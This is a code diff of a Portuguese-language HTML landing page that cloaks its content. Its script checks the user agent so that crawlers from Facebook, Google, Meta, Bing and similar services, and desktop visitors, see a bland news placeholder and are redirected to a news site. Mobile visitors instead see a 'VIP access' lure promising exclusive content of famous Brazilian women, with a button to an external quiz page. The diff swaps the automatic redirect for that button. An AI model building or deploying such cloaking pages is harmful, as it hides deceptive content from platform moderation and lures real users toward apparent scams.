@@ -1,57 +1,102 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Últimas Notícias - A Televisão</title>
-    <meta name="description" content="As últimas notícias sobre celebridades brasileiras">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Últimas Notícias</title>
     <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
         body {
             font-family: 'Arial', sans-serif;
-            text-align: center;
-            padding: 0;
-            margin: 0;
-            background: #0a0a1a; /* Azul escuro sensual */
+            background: #0a0a1a;
             color: #fff;
             height: 100vh;
+            overflow: hidden;
+        }
+        
+        /* PÁGINA WHITE (para bots) */
+        #white-page {
+            height: 100vh;
             display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            text-align: center;
+        }
+        
+        /* PÁGINA BLACK (para humanos - FULLSCREEN MOBILE) */
+        #black-page {
+            display: none;
+            height: 100vh;
+            width: 100vw;
+            background: linear-gradient(135deg, #1e0028 0%, #2a0a3a 100%);
+            padding: 20px;
+            text-align: center;
+            flex-direction: column;
             justify-content: center;
             align-items: center;
         }
-        #white-page {
-            max-width: 800px;
-            padding: 20px;
-        }
-        #black-page {
-            display: none;
-            background: linear-gradient(135deg, #1e0028 0%, #2a0a3a 100%); /* Roxo escuro sensual */
-            padding: 40px;
-            border-radius: 10px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-            max-width: 400px;
+        
+        .content {
+            max-width: 90%;
             margin: 0 auto;
         }
+        
+        h1 {
+            color: #ff2d55;
+            font-size: 28px;
+            margin-bottom: 20px;
+            text-shadow: 0 2px 5px rgba(0,0,0,0.5);
+        }
+        
+        p {
+            font-size: 18px;
+            margin-bottom: 30px;
+            line-height: 1.5;
+            color: #eee;
+        }
+        
         .btn {
             background: #ff2d55;
             color: white;
-            padding: 15px 30px;
+            padding: 16px 32px;
             border-radius: 50px;
             text-decoration: none;
-            display: inline-block;
-            margin: 15px 5px;
+            font-size: 18px;
             font-weight: bold;
+            display: inline-block;
+            margin: 10px;
+            box-shadow: 0 4px 15px rgba(255,45,85,0.4);
             transition: all 0.3s;
+            border: none;
+            width: 90%;
+            max-width: 300px;
         }
+        
         .btn:hover {
             transform: translateY(-3px);
-            box-shadow: 0 5px 15px rgba(255,45,85,0.4);
+            box-shadow: 0 6px 20px rgba(255,45,85,0.6);
         }
-        h1 {
+        
+        .btn-secondary {
+            background: #444;
             color: #fff;
-            margin-bottom: 20px;
-            text-shadow: 0 2px 5px rgba(0,0,0,0.3);
         }
-        p {
-            margin-bottom: 25px;
-            line-height: 1.6;
+        
+        @media (min-width: 768px) {
+            #black-page {
+                padding: 40px;
+            }
+            h1 {
+                font-size: 32px;
+            }
+            p {
+                font-size: 20px;
+            }
         }
     </style>
 </head>
@@ -60,14 +105,22 @@
     <div id="white-page">
         <h1>Últimas Notícias</h1>
         <p>Carregando as manchetes do dia...</p>
-        <p><small>Fonte: <a href="https://www.atelevisao.com" style="color: #aaa;">A Televisão</a></small></p>
     </div>
 
-    <!-- PÁGINA BLACK (para humanos) -->
+    <!-- PÁGINA BLACK FULLSCREEN (para humanos) -->
     <div id="black-page">
-        <h1>🔥 CONTEÚDO EXCLUSIVO</h1>
-        <p>Acesso liberado apenas para convidados especiais</p>
-        <p style="font-size: 14px; color: #ccc;">Você será redirecionado automaticamente</p>
+        <div class="content">
+            <h1>🔥 ACESSO VIP</h1>
+            <p>Conteúdos exclusivos das famosas mais desejadas do Brasil</p>
+            
+            <a href="https://avelino-star.github.io/Quiz/" class="btn">
+                ENTRAR AGORA
+            </a>
+            
+            <button id="btn-voltar" class="btn btn-secondary">
+                NÃO QUERO
+            </button>
+        </div>
     </div>
 
     <script>
@@ -75,31 +128,28 @@
         function isHuman() {
             const isMobile = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
             const isBot = /bot|facebook|google|meta|twitter|slurp|bing/i.test(navigator.userAgent);
-            
-            // Testes adicionais para humanos
-            const hasTouch = 'ontouchstart' in window;
-            const isSlowConnection = navigator.connection ? navigator.connection.downlink < 5 : false;
-            
-            return isMobile && !isBot && hasTouch && !isSlowConnection;
+            return isMobile && !isBot;
         }
 
         // Fluxo principal
         if (isHuman()) {
-            // Humanos: Mostra black page por 2s e redireciona automaticamente
+            // Humanos: Mostra black page fullscreen
             setTimeout(() => {
                 document.getElementById('white-page').style.display = 'none';
-                document.getElementById('black-page').style.display = 'block';
-                
-                setTimeout(() => {
-                    window.location.href = "https://avelino-star.github.io/Quiz/";
-                }, 2000);
+                document.getElementById('black-page').style.display = 'flex';
             }, 1000);
         } else {
-            // Bots/PCs: Fica na white page e redireciona após 5s
+            // Bots/PCs: Redireciona após 3s
             setTimeout(() => {
                 window.location.href = "https://www.atelevisao.com";
-            }, 5000);
+            }, 3000);
         }
+        
+        // Botão "NÃO QUERO" volta para white page
+        document.getElementById('btn-voltar')?.addEventListener('click', () => {
+            document.getElementById('black-page').style.display = 'none';
+            document.getElementById('white-page').style.display = 'flex';
+        });
     </script>
 </body>
 </html>
